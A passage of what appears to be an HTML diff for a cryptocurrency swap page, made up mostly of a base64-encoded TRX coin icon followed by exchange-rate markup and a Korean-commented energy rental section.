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" alt="TRX" id="recv-coin-img" class="w-7 h-7 rounded-full"><span id="recv-coin-name" class="text-base font-bold text-white">TRX</span></div></div>
                 </div>
                 <div class="bg-slate-950/60 rounded-xl p-4 space-y-2 text-sm mb-5">
                     <div class="flex justify-between text-sm text-slate-400"><span data-i18n="exchange_rate_label">교환 비율</span><span class="text-white font-mono">1 <span id="rate-base">USDT</span> = <span id="exchange-rate">-</span> <span id="rate-quote">TRX</span></span></div>
@@ -257,7 +326,7 @@
             </div>
         </section>
 
-        <!-- Energy Rental Section -->
+        <!-- Energy Rental Section (백업본의 탭 전환 및 내 주소 사용 기능 복원) -->
         <section id="energy-section" class="max-w-xl mx-auto w-full">
             <div class="glass border border-slate-800/90 rounded-2xl p-6 shadow-xl space-y-5">
                 <div class="text-center space-y-1">
